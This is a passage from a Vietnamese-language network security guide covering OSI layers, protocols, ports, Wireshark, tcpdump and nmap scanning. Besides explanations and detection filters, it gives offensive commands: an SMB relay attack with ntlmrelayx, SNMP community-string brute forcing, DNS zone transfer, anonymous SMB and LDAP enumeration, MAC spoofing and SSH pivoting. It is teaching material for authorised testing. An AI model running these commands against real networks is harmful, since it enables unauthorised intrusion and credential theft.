# NETWORK SECURITY - COMPLETE GUIDE: TỪ ZERO ĐẾN RED TEAM

> **Dành cho**: Security Researcher muốn master networking
> **Phương châm**: Hiểu bản chất, không học vẹt. Mỗi kỹ thuật tấn công đều đi kèm giải thích WHY nó hoạt động.
> **Lưu ý**: Tất cả kỹ thuật tấn công chỉ được sử dụng trong môi trường lab có sự cho phép hoặc trong authorized penetration testing.

---

## MỤC LỤC

- [PHẦN 1: NỀN TẢNG MẠNG](#phần-1-nền-tảng-mạng)
- [PHẦN 2: CÔNG CỤ MẠNG CƠ BẢN](#phần-2-công-cụ-mạng-cơ-bản)
- [PHẦN 3: NETWORK SCANNING & ENUMERATION](#phần-3-network-scanning--enumeration)
- [PHẦN 4: KỸ THUẬT TẤN CÔNG MẠNG](#phần-4-kỹ-thuật-tấn-công-mạng)
- [PHẦN 5: RED TEAM NETWORKING](#phần-5-red-team-networking)
- [PHẦN 6: PROXY & TRAFFIC INTERCEPTION](#phần-6-proxy--traffic-interception)
- [PHẦN 7: FIREWALL & DEFENSE](#phần-7-firewall--defense)
- [PHẦN 8: WIRELESS NETWORK ATTACKS](#phần-8-wireless-network-attacks)
- [PHẦN 9: ADVANCED TOPICS](#phần-9-advanced-topics)
- [PHẦN 10: LAB THỰC HÀNH](#phần-10-lab-thực-hành)

---

# PHẦN 1: NỀN TẢNG MẠNG

## 1.1 Mô hình OSI (Open Systems Interconnection)

Mô hình OSI chia việc truyền thông mạng thành 7 tầng. Mỗi tầng có nhiệm vụ riêng. Hiểu OSI = hiểu được TẠI SAO mỗi kỹ thuật tấn công hoạt động ở tầng nào.

```
┌─────────────────────────────────────────────────────────────────┐
│ Layer 7 - Application    │ HTTP, FTP, DNS, SMTP, SSH, SNMP     │
│ Layer 6 - Presentation   │ SSL/TLS, JPEG, ASCII, Encryption    │
│ Layer 5 - Session        │ NetBIOS, RPC, PPTP                  │
│ Layer 4 - Transport      │ TCP, UDP                            │
│ Layer 3 - Network        │ IP, ICMP, ARP, IGMP                 │
│ Layer 2 - Data Link      │ Ethernet, Wi-Fi (802.11), PPP       │
│ Layer 1 - Physical       │ Cáp mạng, sóng radio, hub           │
└─────────────────────────────────────────────────────────────────┘
```

### Layer 1 - Physical (Tầng Vật lý)

**Nhiệm vụ**: Truyền bit (0 và 1) qua môi trường vật lý.

**Chi tiết**:
- Đây là tầng thấp nhất, xử lý tín hiệu điện/quang/sóng radio
- Các thiết bị: Hub, Repeater, Modem, cáp mạng (UTP, STP, Fiber Optic)
- Cáp UTP Cat5e: tốc độ 1Gbps, Cat6: 10Gbps, Cat6a: 10Gbps (dài hơn)
- Fiber Optic: Single-mode (khoảng cách xa, 1 luồng ánh sáng), Multi-mode (khoảng cách ngắn, nhiều luồng)

**Góc nhìn Security**:
- Tấn công vật lý: cắm thiết bị nghe lén (network tap) vào cáp mạng
- Keylogger phần cứng
- Rogue device (thiết bị giả mạo cắm vào mạng)
- Electromagnetic eavesdropping (TEMPEST) - nghe trộm qua tín hiệu điện từ

### Layer 2 - Data Link (Tầng Liên kết Dữ liệu)

**Nhiệm vụ**: Đóng gói dữ liệu thành frame, xử lý địa chỉ MAC, kiểm soát lỗi.

**Chi tiết**:
- **MAC Address** (Media Access Control): Địa chỉ 48-bit, ghi dưới dạng hex
  - Ví dụ: `AA:BB:CC:DD:EE:FF`
  - 3 byte đầu = OUI (Organizationally Unique Identifier) → nhận diện nhà sản xuất
  - 3 byte sau = Device ID
  - `FF:FF:FF:FF:FF:FF` = Broadcast address (gửi cho tất cả thiết bị trong LAN)
- **Ethernet Frame**:
  ```
  ┌──────────┬──────────┬──────────┬──────┬──────────┬─────┐
  │ Preamble │ Dest MAC │ Src MAC  │ Type │ Payload  │ FCS │
  │ 8 bytes  │ 6 bytes  │ 6 bytes  │ 2 B  │ 46-1500  │ 4 B │
  └──────────┴──────────┴──────────┴──────┴──────────┴─────┘
  ```
- **Switch**: Thiết bị Layer 2, duy trì bảng MAC (CAM table) để biết port nào nối với MAC nào
- **VLAN** (Virtual LAN): Chia mạng vật lý thành nhiều mạng logic
  - Trunk port: Mang traffic của nhiều VLAN (sử dụng 802.1Q tagging)
  - Access port: Thuộc về 1 VLAN duy nhất
- **ARP** (Address Resolution Protocol): Ánh xạ IP → MAC
  - ARP Request: "Ai có IP 192.168.1.1?" (broadcast)
  - ARP Reply: "Tôi có IP 192.168.1.1, MAC tôi là XX:XX:XX:XX:XX:XX" (unicast)
  - ARP Cache: Bảng lưu tạm các ánh xạ IP-MAC

**Góc nhìn Security**:
- ARP Spoofing/Poisoning: Gửi ARP Reply giả để redirect traffic
- MAC Flooding: Tràn bảng CAM của switch → switch hoạt động như hub
- VLAN Hopping: Nhảy qua VLAN khác bằng double-tagging hoặc switch spoofing
- STP Attack: Khai thác Spanning Tree Protocol để trở thành root bridge

### Layer 3 - Network (Tầng Mạng)

**Nhiệm vụ**: Định tuyến gói tin giữa các mạng khác nhau, xử lý địa chỉ IP.

**Chi tiết**:

#### IPv4

```
┌─────┬─────┬──────────┬────────────────────┐
│ Ver │ IHL │ TOS      │ Total Length        │
├─────┴─────┴──────────┼────────────────────┤
│ Identification       │ Flags │ Frag Offset│
├──────────────────────┼────────────────────┤
│ TTL  │ Protocol      │ Header Checksum    │
├──────────────────────┴────────────────────┤
│ Source IP Address                          │
├───────────────────────────────────────────┤
│ Destination IP Address                     │
├───────────────────────────────────────────┤
│ Options (if any)                           │
└───────────────────────────────────────────┘
```

- **IP Address**: 32-bit, chia thành 4 octet (ví dụ: 192.168.1.100)
- **Subnet Mask**: Xác định phần network và phần host
  - `/24` = `255.255.255.0` → 256 địa chỉ, 254 host khả dụng
  - `/16` = `255.255.0.0` → 65,536 địa chỉ
  - `/8` = `255.0.0.0` → 16,777,216 địa chỉ

**Cách tính subnet** (quan trọng cho pentest):
```
IP:     192.168.1.100
Mask:   255.255.255.0  (/24)
Binary: 11111111.11111111.11111111.00000000

Network:   192.168.1.0
Broadcast: 192.168.1.255
First Host: 192.168.1.1
Last Host:  192.168.1.254
Usable:     254 hosts

Ví dụ /25:
Mask: 255.255.255.128
Binary: 11111111.11111111.11111111.10000000
→ 2 subnet mỗi subnet 126 hosts
  Subnet 1: 192.168.1.0   - 192.168.1.127
  Subnet 2: 192.168.1.128 - 192.168.1.255
```

**Dải IP Private** (không route trên Internet):
```
Class A: 10.0.0.0      - 10.255.255.255    (/8)
Class B: 172.16.0.0    - 172.31.255.255    (/12)
Class C: 192.168.0.0   - 192.168.255.255   (/16)
```

**Các địa chỉ đặc biệt**:
```
127.0.0.1       → Loopback (localhost)
0.0.0.0         → Tất cả interfaces
169.254.x.x     → APIPA (tự cấp khi không có DHCP)
224.0.0.0/4     → Multicast
255.255.255.255 → Broadcast toàn mạng
```

#### IPv6

- 128-bit address, viết dưới dạng hex
- Ví dụ: `2001:0db8:85a3:0000:0000:8a2e:0370:7334`
- Rút gọn: `2001:db8:85a3::8a2e:370:7334` (bỏ các nhóm 0 liên tiếp)
- `::1` = loopback
- `fe80::/10` = Link-local (tương tự 169.254.x.x của IPv4)
- Không có broadcast, thay bằng multicast

#### ICMP (Internet Control Message Protocol)

- Dùng cho chẩn đoán mạng (ping, traceroute)
- **Type 8**: Echo Request (ping gửi đi)
- **Type 0**: Echo Reply (ping trả về)
- **Type 3**: Destination Unreachable
  - Code 0: Network unreachable
  - Code 1: Host unreachable
  - Code 3: Port unreachable
  - Code 13: Communication administratively prohibited (bị firewall chặn)
- **Type 11**: Time Exceeded (TTL hết → traceroute hoạt động dựa vào cái này)

#### Routing (Định tuyến)

```
# Xem bảng routing trên Linux
ip route show
# hoặc
route -n

# Xem trên Windows
route print

# Default gateway = nơi gửi packet khi không biết gửi đi đâu
default via 192.168.1.1 dev eth0
```

**Static Route vs Dynamic Route**:
- Static: Admin cấu hình tay
- Dynamic: Router tự học đường đi qua giao thức routing (OSPF, BGP, RIP, EIGRP)

**Góc nhìn Security**:
- IP Spoofing: Giả mạo source IP
- ICMP Redirect Attack: Lừa host thay đổi routing table
- Route Injection: Inject đường đi giả vào routing protocol
- TTL manipulation: Dùng trong firewall evasion

### Layer 4 - Transport (Tầng Vận chuyển)

**Nhiệm vụ**: Đảm bảo dữ liệu truyền tin cậy (TCP) hoặc nhanh (UDP) giữa hai endpoint.

#### TCP (Transmission Control Protocol)

**TCP Header**:
```
┌────────────────────┬────────────────────┐
│ Source Port (16)   │ Dest Port (16)     │
├────────────────────┴────────────────────┤
│ Sequence Number (32)                     │
├─────────────────────────────────────────┤
│ Acknowledgment Number (32)               │
├─────┬──────┬───────┬────────────────────┤
│ Off │ Res  │ Flags │ Window Size (16)   │
├─────┴──────┴───────┼────────────────────┤
│ Checksum (16)      │ Urgent Pointer(16) │
└────────────────────┴────────────────────┘
```

**TCP Flags** (CỰC KỲ QUAN TRỌNG cho scanning):
```
URG (Urgent)   - Dữ liệu khẩn cấp
ACK (Acknowledge) - Xác nhận
PSH (Push)     - Đẩy dữ liệu ngay lên tầng application
RST (Reset)    - Reset kết nối
SYN (Synchronize) - Bắt đầu kết nối
FIN (Finish)   - Kết thúc kết nối
```

**TCP 3-Way Handshake** (BẮT BUỘC phải hiểu):
```
Client                    Server
  │                         │
  │──── SYN ───────────────>│  "Tôi muốn kết nối, seq=100"
  │                         │
  │<─── SYN-ACK ───────────│  "OK, seq=300, ack=101"
  │                         │
  │──── ACK ───────────────>│  "Nhận, ack=301"
  │                         │
  │   Connection ESTABLISHED │
```

**Tại sao quan trọng cho security?**
- **SYN Scan** (Half-open): Gửi SYN, nhận SYN-ACK → port open, gửi RST (không hoàn thành handshake → ít log hơn)
- **SYN Flood**: Gửi hàng triệu SYN mà không bao giờ ACK → server hết tài nguyên chờ

**TCP Connection Termination** (4-Way):
```
Client                    Server
  │──── FIN ───────────────>│
  │<─── ACK ───────────────│
  │<─── FIN ───────────────│
  │──── ACK ───────────────>│
```

**TCP States**:
```
LISTEN      → Server đang chờ kết nối
SYN_SENT    → Client đã gửi SYN
SYN_RECEIVED → Server nhận SYN, gửi SYN-ACK
ESTABLISHED → Kết nối thành công
FIN_WAIT_1  → Đã gửi FIN
FIN_WAIT_2  → Nhận ACK cho FIN
TIME_WAIT   → Chờ để đảm bảo FIN cuối đến nơi
CLOSE_WAIT  → Nhận FIN, chờ application đóng
LAST_ACK    → Đã gửi FIN, chờ ACK cuối
CLOSED      → Kết nối đã đóng
```

#### UDP (User Datagram Protocol)

```
┌────────────────────┬────────────────────┐
│ Source Port (16)   │ Dest Port (16)     │
├────────────────────┼────────────────────┤
│ Length (16)        │ Checksum (16)      │
└────────────────────┴────────────────────┘
```

- Không có handshake, không đảm bảo thứ tự, không đảm bảo đến nơi
- Nhanh hơn TCP
- Dùng cho: DNS (port 53), DHCP (67/68), SNMP (161/162), TFTP (69), streaming, gaming, VoIP

**Góc nhìn Security**:
- UDP scan khó hơn TCP vì không có handshake → phải chờ ICMP Port Unreachable
- DNS Amplification Attack: Dùng UDP spoofed source IP để amplify traffic
- NTP Amplification: Tương tự với NTP

### Layer 5 - Session (Tầng Phiên)

**Nhiệm vụ**: Quản lý phiên kết nối giữa hai ứng dụng.

- Thiết lập, duy trì, kết thúc phiên
- Giao thức: NetBIOS, RPC, PPTP, L2TP
- SMB (Server Message Block) hoạt động ở tầng này

### Layer 6 - Presentation (Tầng Trình bày)

**Nhiệm vụ**: Mã hóa, nén, chuyển đổi dữ liệu.

- Encoding: ASCII, Unicode, EBCDIC
- Encryption: SSL/TLS handshake
- Compression: gzip, deflate
- Format: JPEG, PNG, MPEG, GIF

### Layer 7 - Application (Tầng Ứng dụng)

**Nhiệm vụ**: Giao diện giữa người dùng và mạng.

Các giao thức quan trọng:

## 1.2 Các Giao thức Quan trọng (Chi tiết)

### DNS (Domain Name System) - Port 53

**DNS là gì?** Hệ thống dịch tên miền → IP address.

**Cách DNS hoạt động**:
```
1. Bạn gõ google.com vào trình duyệt
2. OS kiểm tra file hosts (/etc/hosts hoặc C:\Windows\System32\drivers\etc\hosts)
3. Kiểm tra DNS cache local
4. Hỏi DNS Resolver (thường là DNS của ISP hoặc 8.8.8.8)
5. Resolver hỏi Root DNS Server (.)
6. Root chỉ đến TLD Server (.com)
7. TLD chỉ đến Authoritative DNS Server (google.com)
8. Authoritative trả về IP
9. Resolver cache kết quả, trả về cho client
```

**Các loại DNS Record**:
```
A       → Ánh xạ domain → IPv4          (google.com → 142.250.x.x)
AAAA    → Ánh xạ domain → IPv6
CNAME   → Alias (www.google.com → google.com)
MX      → Mail server                    (google.com → smtp.google.com)
NS      → Name Server                    (google.com → ns1.google.com)
TXT     → Text record (SPF, DKIM, v.v.)
SOA     → Start of Authority
PTR     → Reverse lookup (IP → domain)
SRV     → Service record (port + host)
```

**DNS cho Security Researcher**:
```bash
# Truy vấn DNS cơ bản
nslookup example.com
dig example.com

# Truy vấn record cụ thể
dig example.com MX
dig example.com NS
dig example.com TXT
dig example.com ANY

# Reverse DNS lookup
dig -x 8.8.8.8

# DNS Zone Transfer (nếu server cấu hình sai → lộ toàn bộ record!)
dig axfr @ns1.example.com example.com

# Truy vấn qua DNS server cụ thể
dig @8.8.8.8 example.com

# Trace đường đi DNS
dig +trace example.com

# Xem DNS cache trên Windows
ipconfig /displaydns
```

**Tấn công DNS**:
- **DNS Spoofing/Cache Poisoning**: Inject record giả vào DNS cache
- **DNS Zone Transfer**: Khai thác cấu hình sai để lấy toàn bộ DNS record
- **DNS Tunneling**: Ẩn dữ liệu trong DNS queries để bypass firewall (dùng iodine, dnscat2)
- **DNS Rebinding**: Thay đổi record DNS để bypass Same-Origin Policy
- **Subdomain Takeover**: Chiếm subdomain khi CNAME trỏ đến service đã bỏ

### HTTP/HTTPS - Port 80/443

**HTTP Request**:
```
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Language: en-US
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: session=abc123
```

**HTTP Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Set-Cookie: session=xyz789; HttpOnly; Secure
Server: Apache/2.4.41

<html>...</html>
```

**HTTP Methods**:
```
GET     → Lấy dữ liệu
POST    → Gửi dữ liệu (tạo mới)
PUT     → Cập nhật toàn bộ resource
PATCH   → Cập nhật một phần
DELETE  → Xóa resource
HEAD    → Giống GET nhưng không có body (chỉ header)
OPTIONS → Xem server hỗ trợ method nào (CORS preflight)
TRACE   → Debug (nguy hiểm nếu bật → XST attack)
CONNECT → Tạo tunnel (dùng cho HTTPS qua proxy)
```

**HTTP Status Codes quan trọng**:
```
200 OK                    → Thành công
301 Moved Permanently     → Redirect vĩnh viễn
302 Found                 → Redirect tạm thời
304 Not Modified          → Cache còn hiệu lực
400 Bad Request           → Request sai cú pháp
401 Unauthorized          → Chưa xác thực
403 Forbidden             → Không có quyền
404 Not Found             → Không tìm thấy
405 Method Not Allowed    → Method không được hỗ trợ
429 Too Many Requests     → Rate limited
500 Internal Server Error → Lỗi server
502 Bad Gateway           → Proxy/gateway nhận response lỗi
503 Service Unavailable   → Server quá tải hoặc bảo trì
```

**HTTPS = HTTP + TLS**:
```
TLS Handshake (TLS 1.2):
1. Client Hello     → Gửi TLS version, cipher suites, random
2. Server Hello     → Chọn cipher, gửi certificate, random
3. Certificate      → Server gửi SSL cert (chứa public key)
4. Client Key Exch  → Client tạo pre-master secret, mã hóa bằng public key
5. Change Cipher    → Cả hai chuyển sang encrypted communication
6. Finished         → Verify handshake integrity

TLS 1.3 (nhanh hơn):
1. Client Hello     → Kèm key share
2. Server Hello     → Kèm key share, certificate, finished
3. Client Finished  → 1-RTT handshake!
```

### DHCP (Dynamic Host Configuration Protocol) - Port 67/68

**DHCP DORA Process**:
```
Client                    Server
  │                         │
  │─── DISCOVER (broadcast)─>│  "Ai có IP cho tôi?"
  │                         │
  │<── OFFER ──────────────│  "Tôi có 192.168.1.100 cho bạn"
  │                         │
  │─── REQUEST (broadcast)──>│  "Tôi chọn 192.168.1.100"
  │                         │
  │<── ACK ────────────────│  "OK, của bạn rồi, lease 24h"
```

**Thông tin DHCP cung cấp**:
- IP Address
- Subnet Mask
- Default Gateway
- DNS Server
- Lease Time
- Domain Name

**Tấn công DHCP**:
- **DHCP Starvation**: Gửi hàng ngàn DISCOVER với MAC giả → hết IP pool
- **Rogue DHCP Server**: Dựng DHCP server giả, cung cấp gateway giả (là attacker) → MITM

### SSH (Secure Shell) - Port 22

```bash
# Kết nối cơ bản
ssh user@192.168.1.100

# Kết nối với port khác
ssh -p 2222 user@192.168.1.100

# SSH key authentication
ssh-keygen -t ed25519              # Tạo key pair
ssh-copy-id user@192.168.1.100    # Copy public key lên server

# SSH Tunneling (CỰC KỲ QUAN TRỌNG cho Red Team)
# Local Port Forwarding: truy cập service remote qua local port
ssh -L 8080:internal-server:80 user@jumpbox
# Giờ truy cập localhost:8080 = truy cập internal-server:80

# Remote Port Forwarding: expose local service ra remote
ssh -R 9090:localhost:3000 user@vps
# Giờ vps:9090 = localhost:3000

# Dynamic Port Forwarding (SOCKS proxy)
ssh -D 1080 user@vps
# Cấu hình browser dùng SOCKS5 proxy localhost:1080
# → Tất cả traffic đi qua VPS

# SSH qua proxy
ssh -o ProxyCommand='nc -X 5 -x proxy:1080 %h %p' user@target
```

### SMB (Server Message Block) - Port 445 (và 139)

**SMB là gì?** Giao thức chia sẻ file/printer trên Windows network.

```bash
# Liệt kê share
smbclient -L //192.168.1.100 -N          # Anonymous
smbclient -L //192.168.1.100 -U username

# Kết nối vào share
smbclient //192.168.1.100/sharename -U username

# Enum SMB với enum4linux
enum4linux -a 192.168.1.100

# Enum với CrackMapExec
crackmapexec smb 192.168.1.0/24

# SMB relay attack
ntlmrelayx.py -tf targets.txt -smb2support
```

**Lỗ hổng SMB nổi tiếng**:
- MS17-010 (EternalBlue) → WannaCry ransomware
- MS08-067 → Conficker worm
- SMB Signing disabled → relay attack

### FTP (File Transfer Protocol) - Port 20/21

```bash
# Kết nối
ftp 192.168.1.100

# Anonymous login (nếu server cho phép)
ftp 192.168.1.100
> Username: anonymous
> Password: (anything)

# Active vs Passive mode
# Active: Server kết nối ngược lại client (port 20) → bị firewall chặn
# Passive: Client kết nối đến server (random high port) → NAT-friendly
```

**Security issues**: FTP truyền plaintext (credentials + data) → dùng SFTP/FTPS thay thế.

### SNMP (Simple Network Management Protocol) - Port 161/162

```bash
# Quét SNMP
snmpwalk -v2c -c public 192.168.1.1      # Community string "public"
snmpwalk -v2c -c private 192.168.1.1     # Community string "private"

# Brute force community string
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.1

# SNMP enum
snmp-check 192.168.1.1
```

**Tại sao SNMP nguy hiểm?**
- Community string mặc định: `public` (read), `private` (write)
- SNMPv1/v2c: Community string truyền plaintext
- Có thể lộ: hostname, interfaces, routing table, installed software, running processes, user accounts

### LDAP (Lightweight Directory Access Protocol) - Port 389/636

```bash
# LDAP enumeration
ldapsearch -x -H ldap://192.168.1.100 -b "dc=example,dc=com"

# Anonymous bind
ldapsearch -x -H ldap://192.168.1.100 -b "dc=example,dc=com" "(objectclass=*)"

# Với credentials
ldapsearch -x -H ldap://192.168.1.100 -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"
```

## 1.3 Bảng Port quan trọng

```
Port    Protocol    Service              Ghi chú Security
─────   ─────────   ─────────────────    ─────────────────────────
20      TCP         FTP Data             Plaintext
21      TCP         FTP Control          Plaintext, anonymous login
22      TCP         SSH                  Brute force, key-based auth
23      TCP         Telnet               Plaintext (KHÔNG BAO GIỜ dùng)
25      TCP         SMTP                 Email relay, spoofing
53      TCP/UDP     DNS                  Zone transfer, tunneling
67/68   UDP         DHCP                 Starvation, rogue server
69      UDP         TFTP                 Không xác thực
80      TCP         HTTP                 Web attacks
88      TCP         Kerberos             Kerberoasting, AS-REP roast
110     TCP         POP3                 Plaintext email
111     TCP         RPCbind              NFS enumeration
135     TCP         MS-RPC               Endpoint mapper
139     TCP         NetBIOS              SMB enumeration
143     TCP         IMAP                 Plaintext email
161/162 UDP         SNMP                 Community string brute
389     TCP         LDAP                 Directory enumeration
443     TCP         HTTPS                SSL/TLS attacks
445     TCP         SMB                  EternalBlue, relay
465     TCP         SMTPS                Encrypted email
514     UDP         Syslog               Log injection
636     TCP         LDAPS                Encrypted LDAP
993     TCP         IMAPS                Encrypted IMAP
995     TCP         POP3S                Encrypted POP3
1433    TCP         MSSQL                SQL injection, xp_cmdshell
1521    TCP         Oracle DB            TNS listener
2049    TCP         NFS                  File share enumeration
3306    TCP         MySQL                SQL injection
3389    TCP         RDP                  Brute force, BlueKeep
5432    TCP         PostgreSQL           SQL injection
5900    TCP         VNC                  Weak/no auth
5985    TCP         WinRM (HTTP)         Remote PowerShell
5986    TCP         WinRM (HTTPS)        Remote PowerShell
6379    TCP         Redis                No auth default
8080    TCP         HTTP Alt             Web proxy, admin panels
8443    TCP         HTTPS Alt            Admin panels
8888    TCP         HTTP Alt             Dev servers
27017   TCP         MongoDB              No auth default
```

## 1.4 NAT (Network Address Translation)

**NAT là gì?** Chuyển đổi IP private ↔ public khi traffic ra/vào Internet.

**Các loại NAT**:
```
1. Static NAT    : 1 Private IP ↔ 1 Public IP (1:1)
2. Dynamic NAT   : Pool Private IPs ↔ Pool Public IPs
3. PAT (Overload): Nhiều Private IPs → 1 Public IP (dùng port khác nhau)
                   Đây là loại phổ biến nhất (router nhà bạn dùng loại này)
```

**PAT hoạt động thế nào**:
```
Internal: 192.168.1.10:12345 → Router NAT → 203.0.113.1:40001 → Internet
Internal: 192.168.1.11:12345 → Router NAT → 203.0.113.1:40002 → Internet
Internal: 192.168.1.12:54321 → Router NAT → 203.0.113.1:40003 → Internet
```

**Góc nhìn Security**:
- NAT không phải firewall! Nó giấu IP internal nhưng không block traffic
- NAT traversal: Kỹ thuật để kết nối qua NAT (STUN, TURN, ICE)
- Reverse shell phải "gọi ra" (outbound) vì NAT block inbound mặc định

---

# PHẦN 2: CÔNG CỤ MẠNG CƠ BẢN

## 2.1 Các lệnh Network cơ bản

### ping
```bash
# Kiểm tra host còn sống không
ping 192.168.1.1
ping -c 4 192.168.1.1          # Linux: gửi 4 gói
ping -n 4 192.168.1.1          # Windows: gửi 4 gói

# Ping với size lớn (test fragmentation)
ping -s 1472 192.168.1.1       # Linux
ping -l 1472 192.168.1.1       # Windows

# Ping sweep (tìm host sống trong subnet)
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is alive"; done
```

### traceroute / tracert
```bash
# Xem đường đi của packet
traceroute 8.8.8.8             # Linux (dùng UDP mặc định)
tracert 8.8.8.8                # Windows (dùng ICMP)

# Traceroute dùng TCP (bypass firewall block ICMP/UDP)
traceroute -T -p 443 8.8.8.8

# Traceroute dùng ICMP
traceroute -I 8.8.8.8

# Cách hoạt động:
# Gửi packet với TTL=1 → router đầu tiên drop, trả ICMP Time Exceeded
# Gửi packet với TTL=2 → router thứ hai drop
# ... tiếp tục cho đến khi đến đích
```

### netstat / ss
```bash
# Xem tất cả kết nối đang mở
netstat -an                    # Cả hai OS
ss -tuln                       # Linux (nhanh hơn netstat)

# Chi tiết các flag:
# -t : TCP
# -u : UDP
# -l : Listening (đang lắng nghe)
# -n : Hiển thị số (không resolve DNS)
# -p : Hiển thị process ID/name
# -a : All connections

# Xem process nào đang listen
ss -tlnp                       # Linux
netstat -tlnp                  # Linux
netstat -ano                   # Windows (rồi dùng tasklist /fi "PID eq XXX")

# Xem kết nối đến một port cụ thể
ss -tn state established '( dport = :443 )'

# Đếm kết nối theo state
ss -s
```

### ip / ifconfig
```bash
# Xem interface mạng
ip addr show                   # Linux (mới)
ifconfig                       # Linux (cũ) / macOS
ipconfig                       # Windows

# Xem routing table
ip route show
route -n                       # Linux
route print                    # Windows

# Xem ARP table
ip neigh show                  # Linux
arp -a                         # Windows / Linux

# Thay đổi MAC address (hữu ích cho MAC filtering bypass)
ip link set eth0 down
ip link set eth0 address AA:BB:CC:DD:EE:FF
ip link set eth0 up
# hoặc dùng macchanger
macchanger -r eth0             # Random MAC
```

### curl / wget
```bash
# GET request
curl http://example.com
curl -v http://example.com     # Verbose (xem headers)
curl -I http://example.com     # Chỉ headers (HEAD request)

# POST request
curl -X POST -d "user=admin&pass=123" http://example.com/login
curl -X POST -H "Content-Type: application/json" -d '{"user":"admin"}' http://example.com/api

# Theo redirect
curl -L http://example.com

# Với cookie
curl -b "session=abc123" http://example.com
curl -c cookies.txt http://example.com/login    # Lưu cookie
curl -b cookies.txt http://example.com/admin    # Dùng cookie

# Download file
curl -O http://example.com/file.zip
wget http://example.com/file.zip

# Ignore SSL certificate (cho self-signed cert)
curl -k https://example.com

# Qua proxy
curl -x http://127.0.0.1:8080 http://example.com        # HTTP proxy
curl -x socks5://127.0.0.1:1080 http://example.com      # SOCKS5 proxy
```

## 2.2 Wireshark

**Wireshark** là công cụ phân tích packet mạnh nhất. Bắt buộc phải thành thạo.

### Capture Filters (lọc KHI bắt packet)
```
# Chỉ bắt traffic từ/đến một IP
host 192.168.1.100

# Chỉ bắt traffic đến một port
port 80
port 443

# Chỉ bắt TCP
tcp

# Chỉ bắt traffic của một subnet
net 192.168.1.0/24

# Kết hợp
host 192.168.1.100 and port 80
```

### Display Filters (lọc SAU KHI bắt)
```
# Lọc theo protocol
http
dns
tcp
udp
arp
icmp
tls
smb

# Lọc theo IP
ip.addr == 192.168.1.100
ip.src == 192.168.1.100
ip.dst == 10.0.0.1

# Lọc theo port
tcp.port == 80
tcp.dstport == 443
udp.port == 53

# Lọc theo TCP flags
tcp.flags.syn == 1
tcp.flags.syn == 1 && tcp.flags.ack == 0    # Chỉ SYN (không phải SYN-ACK)
tcp.flags.rst == 1

# Lọc HTTP
http.request.method == "GET"
http.request.method == "POST"
http.response.code == 200
http.host contains "example"
http.request.uri contains "admin"

# Lọc DNS
dns.qry.name contains "example"
dns.flags.response == 1

# Lọc theo nội dung (string search)
frame contains "password"
tcp contains "login"

# Kết hợp phức tạp
(ip.src == 192.168.1.100) && (tcp.dstport == 80) && (http.request.method == "POST")

# Follow TCP Stream: Right-click packet → Follow → TCP Stream
# → Xem toàn bộ cuộc hội thoại HTTP/TCP
```

### Phân tích Wireshark thực tế

**Phát hiện ARP Spoofing**:
```
arp.duplicate-address-detected
# Hoặc tìm: nhiều ARP reply cho cùng IP nhưng MAC khác nhau
```

**Phát hiện Port Scan**:
```
# Nhiều SYN đến nhiều port khác nhau từ cùng IP
tcp.flags.syn == 1 && tcp.flags.ack == 0
# Rồi xem Statistics → Conversations → TCP
```

**Phát hiện DNS Tunneling**:
```
dns
# Tìm: DNS queries với subdomain rất dài hoặc TXT records lớn bất thường
dns.qry.name.len > 50
```

## 2.3 tcpdump

**tcpdump** = Wireshark dạng command line. Dùng trên server không có GUI.

```bash
# Bắt tất cả traffic
sudo tcpdump -i eth0

# Bắt và lưu file pcap (mở bằng Wireshark sau)
sudo tcpdump -i eth0 -w capture.pcap

# Đọc file pcap
tcpdump -r capture.pcap

# Lọc theo host
sudo tcpdump -i eth0 host 192.168.1.100

# Lọc theo port
sudo tcpdump -i eth0 port 80

# Lọc theo protocol
sudo tcpdump -i eth0 tcp
sudo tcpdump -i eth0 udp
sudo tcpdump -i eth0 icmp

# Hiển thị nội dung packet (hex + ASCII)
sudo tcpdump -i eth0 -X port 80

# Chỉ hiển thị ASCII
sudo tcpdump -i eth0 -A port 80

# Bắt N packet rồi dừng
sudo tcpdump -i eth0 -c 100 port 80

# Không resolve DNS (nhanh hơn)
sudo tcpdump -i eth0 -n port 80

# Kết hợp phức tạp
sudo tcpdump -i eth0 'src 192.168.1.100 and dst port 443'
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'    # Chỉ SYN packets

# Bắt traffic HTTP (xem nội dung)
sudo tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

---

# PHẦN 3: NETWORK SCANNING & ENUMERATION

## 3.1 Nmap (Network Mapper) - Công cụ scan số 1

### Host Discovery (Tìm host sống)

```bash
# Ping scan (không scan port)
nmap -sn 192.168.1.0/24

# ARP scan (chỉ trong LAN, chính xác nhất)
nmap -PR -sn 192.168.1.0/24

# TCP SYN ping (port 443 mặc định)
nmap -PS443 -sn 192.168.1.0/24

# TCP ACK ping
nmap -PA80 -sn 192.168.1.0/24

# UDP ping
nmap -PU53 -sn 192.168.1.0/24

# ICMP ping
nmap -PE -sn 192.168.1.0/24

# Không ping (scan luôn, hữu ích khi ICMP bị chặn)
nmap -Pn 192.168.1.100

# Scan từ file danh sách
nmap -iL targets.txt -sn
```

### Port Scanning Techniques

```bash
# TCP SYN Scan (Half-open, mặc định, cần root)
# Gửi SYN → nhận SYN-ACK = open, RST = closed, không trả lời = filtered
sudo nmap -sS 192.168.1.100

# TCP Connect Scan (Full handshake, không cần root)
nmap -sT 192.168.1.100

# UDP Scan (chậm vì phải chờ ICMP unreachable)
sudo nmap -sU 192.168.1.100

# TCP ACK Scan (phát hiện firewall rules, không phát hiện port open/closed)
# Nhận RST = unfiltered, không trả lời = filtered
sudo nmap -sA 192.168.1.100

# FIN Scan (Stealth - gửi FIN, port closed trả RST, open im lặng)
sudo nmap -sF 192.168.1.100

# Xmas Scan (FIN + PSH + URG flags)
sudo nmap -sX 192.168.1.100

# Null Scan (không set flag nào)
sudo nmap -sN 192.168.1.100

# Window Scan (giống ACK nhưng check window size)
sudo nmap -sW 192.168.1.100

# Maimon Scan (FIN + ACK)
sudo nmap -sM 192.168.1.100

